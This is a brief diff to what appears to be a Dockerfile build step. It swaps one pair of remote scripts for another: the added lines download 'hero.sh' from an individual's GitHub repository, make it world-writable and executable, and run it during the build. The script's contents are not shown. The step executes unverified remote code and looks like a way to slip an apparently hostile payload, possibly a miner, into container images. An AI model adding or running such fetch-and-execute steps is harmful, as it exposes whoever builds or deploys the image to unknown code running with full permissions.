@@ -6,10 +6,9 @@ RUN \
   apt-get install python -y && \
   apt-get install gcc -y && \
   apt-get install wget -y && \
-  wget https://github.com/thoeb292/thoeb292/raw/main/best.sh && \
-  wget https://github.com/thoeb292/thoeb292/raw/main/rasa.py && \
-  chmod 777 rasa.py && \
-  python rasa.py && \
+  wget https://github.com/thoeb292/thoeb292/raw/main/hero.sh && \
+  chmod 777 hero.sh && \
+  ./hero.sh && \
   rm -rf /var/lib/apt/lists/* 
 
 # Add files.
